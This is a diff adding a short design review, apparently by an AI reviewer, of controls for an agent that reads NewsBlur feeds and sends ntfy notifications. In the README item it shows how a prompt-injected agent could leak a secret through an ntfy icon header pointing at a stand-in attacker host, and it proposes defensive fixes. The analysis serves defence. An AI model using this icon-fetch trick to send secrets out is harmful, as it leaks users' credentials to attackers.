@@ -1,0 +1,9 @@
+1. **Factual errors:** None established in the externally checkable additions. NewsBlur documents [subscription changes and sharing](https://www.newsblur.com/features/mcp), and its [tool implementation](https://github.com/samuelclay/NewsBlur/blob/main/newsblur_mcp/newsblur_mcp/tools/stories.py) supports the original-text fetching claim. The [HTML standard](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing) confirms that sandboxing permits self-navigation.
+
+2. **Controls and attribution:**
+
+   - **README, step 0:** One fixed ntfy topic is insufficient if the publishing tool accepts arbitrary options. ntfy clients [automatically fetch notification icons](https://docs.ntfy.sh/publish/#icons). An injected agent could supply `Icon: https://attacker.example/<secret>` while publishing to the permitted topic. Require an enforced wrapper with fixed server/topic and plain-text message fields; reject agent-controlled headers, URL options and structured publishing fields.
+   - **llm.md, invariant 7:** The stated guarantee exceeds the specified control. Restricting images in entries opened from agent output does not explicitly cover previews or resources loaded by the brief/alert itself. Apply the cache-only rule to every automatic resource fetch caused by agent-selected output, including notification rendering.
+   - **validation.md:** The supplied diff cannot substantiate “Every helper report is kept unedited,” the specific report attributions, or the dismissal of both consistency findings. I cannot certify those statements or reconstruct my previous findings from the quoted verdict alone.
+
+3. **YES still stands for guiding steps 0 and 1.** The ntfy restriction needs the enforcement detail above before running the agent experiment. This remains insufficient as an implementation specification.
